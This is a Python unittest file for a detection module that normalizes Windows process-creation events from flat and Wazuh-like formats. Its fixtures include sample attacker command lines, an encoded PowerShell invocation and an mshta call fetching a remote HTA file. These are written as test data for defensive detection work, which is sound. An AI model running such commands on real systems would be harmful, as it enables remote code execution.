import unittest
from detections.event_mapping import normalize_process_event

class EventMappingTests(unittest.TestCase):
    def test_flat_event(self):
        result = normalize_process_event({"Image": r"C:\Windows\System32\powershell.exe", "CommandLine": "powershell -enc abc", "User": "LAB\\analyst", "EventID": 1})
        self.assertEqual(result["Image"], r"C:\Windows\System32\powershell.exe")
        self.assertEqual(result["EventID"], "1")
        self.assertEqual(result["mapping_status"], "ready_for_reference_harness")

    def test_wazuh_like_envelope(self):
        result = normalize_process_event({"data": {"win": {"system": {"eventID": "1"}, "eventdata": {"image": r"C:\Windows\System32\mshta.exe", "commandLine": "mshta https://example.invalid/a.hta", "parentImage": r"C:\Windows\explorer.exe", "processId": "123"}}}})
        self.assertEqual(result["EventID"], "1")
        self.assertEqual(result["Image"], r"C:\Windows\System32\mshta.exe")
        self.assertEqual(result["ProcessId"], "123")
        self.assertEqual(result["mapping_status"], "ready_for_reference_harness")

    def test_missing_required_fields_is_flagged(self):
        result = normalize_process_event({"EventID": 1, "User": "LAB\\analyst"})
        self.assertEqual(result["mapping_status"], "incomplete_required_fields")
        self.assertEqual(result["CommandLine"], "")

if __name__ == "__main__":
    unittest.main()
